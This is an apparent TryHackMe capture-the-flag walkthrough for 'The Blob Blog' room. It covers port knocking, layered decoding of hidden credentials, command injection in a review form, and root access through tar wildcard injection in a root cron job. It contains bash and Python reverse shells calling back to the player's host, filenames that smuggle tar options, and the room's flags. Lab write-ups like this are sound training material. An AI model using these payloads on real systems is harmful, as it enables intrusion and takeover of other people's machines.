# Tryhackme.com Room : The Blob Blog
`https://tryhackme.com/room/theblobblog`


# Instance
```
export IP=10.10.11.169
```

# Nmap
```
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There is a default apache page on port `80`. In the page we find this base64 string :
```
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==
```

Which translate to
```
+[--->++<]>+.+++[->++++<]>.---.+++++++++.-[->+++++<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.-[->+++<]>-.--[--->+<]>--.+[---->+<]>+++.[->+++<]>+.-[->+++<]>.-[--->++<]>+.--.-----.[->+++<]>.------------.+[----->+<]>.--[--->+<]>.-[---->+<]>++.++[->+++<]>.++++++++++++.---------.----.+++++++++.----------.--[--->+<]>---.+[---->+<]>+++.[->+++<]>+.+++++++++++++.----------.-[--->+<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.--------.++++++.---------.--------.-[--->+<]>-.[->+++<]>+.+++++++++++.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>+.+++.+.------------.++++++++.-[++>---<]>+.+++++[->+++<]>.-.-[->+++++<]>-.++[-->+++<]>.[--->++<]>--.+++++[->+++<]>.---------.[--->+<]>--.+++++[->+++<]>.++++++.---.[-->+++++<]>+++.+[----->+<]>+.---------.++++.--.+.------.+++++++++++++.+++.+.+[---->+<]>+++.+[->+++<]>+.+++++++++++..+++.+.+[++>---<]>.++[--->++<]>..[->++<]>+.[--->+<]>+.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>--.+++++++.++++++.--.++++[->+++<]>.[--->+<]>----.+[---->+<]>+++.[-->+++<]>+.-----.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.++[-->+++<]>.-------.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.-----[->++<]>-.--[--->++<]>-.
```

Reminds me of some esoteric language.

Let's check it out, in the meantime, im running a gobuster scan.

Seems like it's brainfuck. We run the code on an online interpreter and get
```
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!
```

Looking back at the html page, we find this comment at the bottom :
```
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
```

I guess we have a username `bob`

Not sure how to decrypt the password tho... probably related to the message we got from brainfuck ?

Sooo, I had a little look at the begining of a writeup. I'm not familiar with `port knocking` that's why i didn't get the reference.

We can `knock` the ports with `knock $IP 1 3 5 -d 500`

Then running nmap we find some new ports open ! (`21, 445, 8080`)
```
21/tcp   open  ftp     vsftpd 3.0.2
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp  open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.5.3)
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Werkzeug/1.0.1 Python/3.5.3
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

There is no anonymous login on the ftp server.

We get a ubuntu default page on port `8080` and `445` but looking at the headers we see that the instance on port `8080` is runned via `python 3.5.3` and the `Werkzeug 1.0.1` framework.

Let's check out the `8080` instance.

We find with gobuster 
```
/blog (Status: 302)
/login (Status: 200)
/review (Status: 302)
/blog1 (Status: 302)
/blog2 (Status: 302)
/blog3 (Status: 302)
/blog4 (Status: 302)
/blog5 (Status: 302)
/blog6 (Status: 302)
```

All the pages bring us back to /login

We also gobuster port `445` and find `/user` which contains an `openSSH private key`
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Not really sure what to do with it tho

On the apache index page we find this comment
```
Bob, I swear to goodness, if you can't remember p@55w0rd 
It's not that hard
```

After a while trying this password everywhere, I looked a little further in the write up and found that the encoded password was `base58`. Didn't think of that, was trying something related to 135 which was for port knocking.

From `bob:HcfP8J54AK4` we find `bob:cUpC4k3s`.

We can use this to log in in `ftp` but we can't login with these credentials on the blog, neither on ssh.

Not much on the the `ftp` server.
```
-rw-r--r--    1 1001     1001          220 Jul 25 13:07 .bash_logout
-rw-r--r--    1 1001     1001         3771 Jul 25 13:07 .bashrc
-rw-r--r--    1 1001     1001          675 Jul 25 13:07 .profile
-rw-r--r--    1 1001     1001         8980 Jul 25 13:07 examples.desktop
dr-xr-xr-x    3 65534    65534        4096 Jul 25 13:08 ftp
```

The is an image in `/ftp/files/cool.jpeg`
Using `steghide extract -p @55w0rd -sf cool.jpeg` we get a text file with :
```
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
```

on `http://$IP:445/bobs_safe_for_stuff` we get
```
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
```

This is a `vigenere` encoding. The key is `youmayenter` which give
```
bob:d1ff3r3ntP@55w0rd
```

With this we can login into the blog finally !

So we get a really small website were we can leave reviews.

reviews can be browsed through `/review`.

We can inject javascript in the review page `XSS`.

Played around with the review but didn't really understand how to exploit it.
Turns out it direct code execution.. lol `ls` list the files in the directory 
so lets pop a reverse shell
```
bash -i >& /dev/tcp/10.6.32.20/8888 0>&1
```

And we're in as `www-data`

We get some funny naging messages
```
You haven't rooted me yet? Jeez
```

Here are the users
```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
bobloblaw:x:1000:1000:bobloblaw,,,:/home/bobloblaw:/bin/bash
bob:x:1001:1001:,,,:/home/bob:/bin/bash
```

There is 2 dogs images in `/var/www` 

After looking aroun we find this in `cron`
```
*  *    * * *   root    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz *
```

This can be used to gain root access. We can inject parameters to tar by adding files in `/home/bobloblaw/Desktop/.uh_oh` but we can't create files there yet.

Linpeas find that `You have write privileges over /etc/init/flask.conf`

It contains 
```
description "flask"
start on stopped rc RUNLEVEL=[2345]
respawn
exec python /var/www/html2/app.py
```

Hmmm.. but this is runned by `www-data`... not sure how we can use this


I had overlooked the `/usr/bin/blogFeedback` binary which have `SGID` bit set.

When we feed it an input, we get
```
Order my blogs!
```

After some fiddling, i found that `/usr/bin/blogFeedback 1 2 3 4 5 6` give the output
```
Hmm... I disagree!
```

So i just wrote a little python script to try all combinations
```py

import subprocess
import itertools

values = ['1','2','3','4','5','6']

for comb in itertools.permutations(values):
        cmd = "/usr/bin/blogFeedback {}".format(' '.join(comb))

        print(cmd)
        out = subprocess.check_output(cmd, shell=True).decode().strip()

        if 'disagree' not in out:
                print(out)
                break
```

The script just hang when we get the correct order since the script drop a shell.

It ended up being `/usr/bin/blogFeedback 6 5 4 3 2 1`, I guess i could have guessed it...

Anyhow, now we are logged as `bobloblaw`. We can retrieve the private key in `/home/bobloblaw/.ssh` and login via ssh to get a better shell.

Earlier, we found a `cron` job that is vulnerable.

```
*  *    * * *   root    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz *
```

Looking at gtfobins, we can get a shell with tar using
```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

So we just got to craft this command by creating files that will be globed with the `*` in the `cron` job.

I tested that this query worked
```
tar -zcf test.tar.gz --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

So we need to create 2 files :
```
--checkpoint=1
--checkpoint-action=exec=/bin/sh
```

I was able to write `--checkpoint=1` using 
```
python3 -c 'open("--checkpoint=1","w").write("1")'
```

But I can't create a file with slashed in it.
I faced this situation before, one workaround is simply to create a symlink to `/bin/sh` in the current directory.

```
ln -sn /bin/sh sh
``

```
python3 -c 'open("--checkpoint-action=exec=sh","w").write("1")'
```

And now I can get a shell running 
```
tar -zcf test.tar.gz *
```

But this is not really usefull since this is runned in a crontab so we won't get access to this shell.

Instead of just dropping a shell, we can execute a script using this :
```
python3 -c 'open("--checkpoint-action=exec=sh root.sh","w").write("1")'
```

Where `root.sh` can contain a reverse shell:
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.6.32.20/7777 0>&1
```

We also find the `user.txt` flag in `/home/bobloblaw/Desktop/user.txt`
```
THM{C0NGR4t$_g3++ing_this_fur}
```


Hmmm back to trying to get root... Seems like we don't have permissions to create files in `/home/bobloblaw/Desktop/.uh_oh`... 
hmmm... that's problematic... didn't expect that

This was easily fixed by simply renaming the `Desktop` folder and creating a new one with a new `.uh_oh` directory.

Here are the files in this directory :
```
-rw-rw-r-- 1 bobloblaw bobloblaw    1 Nov 20 01:39 --checkpoint=1
-rw-rw-r-- 1 bobloblaw bobloblaw    1 Nov 20 01:39 --checkpoint-action=exec=sh root.sh
-rwxrwxr-x 1 bobloblaw bobloblaw   54 Nov 20 01:39 root.sh
lrwxrwxrwx 1 bobloblaw bobloblaw    7 Nov 20 01:39 sh -> /bin/sh
```

Then we wait for a shell...

Well, the shell never came back.

I tested manually and I get an error with this reverse shell (running root.sh alone works fine)
```
root.sh: 3: root.sh: Syntax error: Bad fd number
```

Let's try this python based shell :
```
#!/bin/bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.32.20",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

And we got a root shell
```
uid=0(root) gid=0(root) groups=0(root)
```

The root flag `/root/root.txt` is 
```
THM{G00D_J0B_G3++1NG+H3R3!}
```